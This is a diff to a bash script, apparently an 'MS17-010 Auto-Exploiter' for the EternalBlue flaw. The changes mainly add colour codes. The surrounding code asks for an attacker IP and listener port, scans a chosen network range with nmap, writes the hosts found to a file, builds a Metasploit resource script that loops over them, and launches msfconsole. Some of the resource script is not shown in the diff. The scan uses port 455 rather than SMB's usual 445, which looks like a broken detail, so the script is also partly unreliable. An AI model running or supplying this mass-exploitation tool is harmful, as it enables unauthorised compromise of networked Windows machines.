@@ -1,16 +1,22 @@
 #!/bin/bash
+#Everyone loves colorful terminals :D
+cyan='\e[0;36m'
+lightgreen='\e[0;32m'
+white='\e[0;37m'
+red='\e[0;31m'
 service postgresql start
 #Remove old files
 if [ -e vuln-ips.txt ];then rm vuln-ips.txt;fi;if [ -e eternal-blue.rc ];then rm eternal-blue.rc;fi;
 #Taking input and shit
-echo;echo -e "*** MS17-010 Auto-Exploiter by Arun Chaudhary ***"
-echo;echo -e "Enter IP (Attacker's IP eg. 192.168.2.102):"
+echo;echo -e $cyan "*** MS17-010 Auto-Exploiter by Arun Chaudhary ***"
+echo -e "\t*** https://github.com/its-arun ***"
+echo -e $white;echo -e "Enter IP (Attacker's IP eg. 192.168.2.102):" $red
 read lip
-echo;echo -e "Enter port(eg. 31337):"
+echo -e $white;echo -e "Enter port(eg. 31337):" $red
 read lp
-echo;echo -e "Enter Network IP (eg. 192.168.2.0/24):"
+echo -e $white;echo -e "Enter Network IP (eg. 192.168.2.0/24):" $red
 read nip
-echo;echo -e "Targets available:"
+echo -e $white;echo -e "Targets available:" $lightgreen
 #Creating list of IP addresses with port 455 open
 touch vuln-ips.txt
 nmap -Pn -p 455 --open $nip -oG - | awk '/Up$/{print $2 > "vuln-ips.txt"}';awk '{print $0}' vuln-ips.txt
@@ -37,9 +43,9 @@ File.open(\"vuln-ips.txt\",\"r\") do |file|
        	end
 end 
 </ruby>" >> eternal-blue.rc
-	echo;echo -e "Exploitation Started"
+	echo -e $lightgreen;echo -e "Exploitation Started"
 	#Fun time
 	msfconsole -r eternal-blue.rc
 else
-	echo "No targets found."
+	echo -e $red "No targets found."
 fi
